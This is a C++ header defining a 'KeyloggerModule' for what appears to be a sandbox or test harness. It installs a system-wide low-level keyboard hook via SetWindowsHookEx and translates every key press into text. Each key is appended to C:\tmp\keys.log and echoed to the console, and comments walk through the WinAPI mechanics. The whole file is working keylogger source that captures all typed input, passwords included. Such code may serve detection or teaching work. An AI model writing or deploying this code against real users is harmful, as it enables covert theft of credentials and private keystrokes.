#pragma once

#include <fstream>
#include <iostream>
#include <array>

#include "SandboxLoader/Modules/IModule.h"

// ─────────────────────────────────────────────────────────────────────────────
// KeyloggerModule
//
// Installs a WH_KEYBOARD_LL (low-level keyboard) global hook via SetWindowsHookEx.
// Every key-down event is logged to C:\tmp\keys.log.
//
// HOW IT WORKS (WinAPI walkthrough)
// ──────────────────────────────────
// WH_KEYBOARD_LL is a system-wide hook that receives keyboard input before it
// reaches any window.  Unlike WH_KEYBOARD it does NOT require a DLL injection –
// the hook runs inside our process on the same thread that calls GetMessage().
//
// IMPORTANT: low-level hooks are only called while GetMessage() / PeekMessage()
// is being pumped on the thread that installed the hook.  Our message loop in
// main() satisfies this requirement automatically.
//
// The hook callback (LowLevelKeyboardProc) is a static function because
// SetWindowsHookEx takes a plain C function pointer.  We recover the module
// instance through a static pointer set during OnCreate().
// ─────────────────────────────────────────────────────────────────────────────

class KeyloggerModule : public IModule
{
public:
    std::wstring Name() const override { return L"KeyloggerModule"; }

    void OnCreate(HWND /*hwnd*/) override
    {
        // Store a pointer so the static hook callback can reach this instance.
        s_instance = this;

        // NULL hMod + dwThreadId 0 → system-wide low-level hook (no DLL needed).
        m_hook = ::SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
        if (!m_hook)
            std::cerr << "[KeyloggerModule] SetWindowsHookEx failed, GLE="
                      << ::GetLastError() << "\n";
        else
            std::wcout << L"[KeyloggerModule] Keyboard hook installed\n";
    }

    // This module does not consume any window messages itself – the hook callback
    // receives keyboard events independently of WndProc.
    bool OnMessage(HWND, UINT, WPARAM, LPARAM) override { return false; }

    void OnDestroy(HWND /*hwnd*/) override
    {
        if (m_hook)
        {
            ::UnhookWindowsHookEx(m_hook);
            m_hook = nullptr;
        }
        s_instance = nullptr;
    }

private:
    HHOOK m_hook = nullptr;

    // Static pointer so the C-style callback can reach back into the instance.
    static KeyloggerModule* s_instance;

    // ── Hook callback ─────────────────────────────────────────────────────────
    // nCode < 0  → must call CallNextHookEx and return immediately (WinAPI rule).
    // wParam     → WM_KEYDOWN / WM_SYSKEYDOWN / WM_KEYUP / WM_SYSKEYUP
    // lParam     → pointer to KBDLLHOOKSTRUCT with the virtual-key code, etc.
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
    {
        if (nCode == HC_ACTION && s_instance)
        {
            // Only log key-down events (ignore key-up to avoid duplicates).
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
            {
                auto* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
                s_instance->LogKey(kb->vkCode);
            }
        }
        // Always forward to the next hook in the chain.
        return ::CallNextHookEx(nullptr, nCode, wParam, lParam);
    }

    // ── Translate VK code → readable label ───────────────────────────────────
    void LogKey(DWORD vkCode)
    {
        std::wstring label = VkToLabel(vkCode);

        std::wofstream file{ LR"(C:\tmp\keys.log)", std::ios_base::app };
        file << label;

        std::wcout << L"[KeyloggerModule] " << label << L"\n";
    }

    static std::wstring VkToLabel(DWORD vk)
    {
        // Printable ASCII range – ask Windows what character this produces.
        BYTE keyState[256] = {};
        ::GetKeyboardState(keyState);

        wchar_t buf[8] = {};
        int result = ::ToUnicode(vk, ::MapVirtualKeyW(vk, MAPVK_VK_TO_VSC),
                                 keyState, buf, 7, 0);
        if (result == 1 && buf[0] >= L' ')
            return std::wstring(1, buf[0]);

        // Special keys – explicit map for the most common ones.
        switch (vk)
        {
        case VK_RETURN:    return L"[ENTER]\n";
        case VK_BACK:      return L"[BACKSPACE]";
        case VK_TAB:       return L"[TAB]";
        case VK_ESCAPE:    return L"[ESC]";
        case VK_SPACE:     return L" ";
        case VK_DELETE:    return L"[DEL]";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:    return L"[SHIFT]";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:  return L"[CTRL]";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:     return L"[ALT]";
        case VK_CAPITAL:   return L"[CAPSLOCK]";
        case VK_LEFT:      return L"[LEFT]";
        case VK_RIGHT:     return L"[RIGHT]";
        case VK_UP:        return L"[UP]";
        case VK_DOWN:      return L"[DOWN]";
        default:
        {
            // Fallback: VK_Fx keys, numpad, etc.
            wchar_t fallback[32];
            swprintf_s(fallback, L"[VK%lu]", vk);
            return fallback;
        }
        }
    }
};

// Static member definition (one translation unit must own this).
inline KeyloggerModule* KeyloggerModule::s_instance = nullptr;
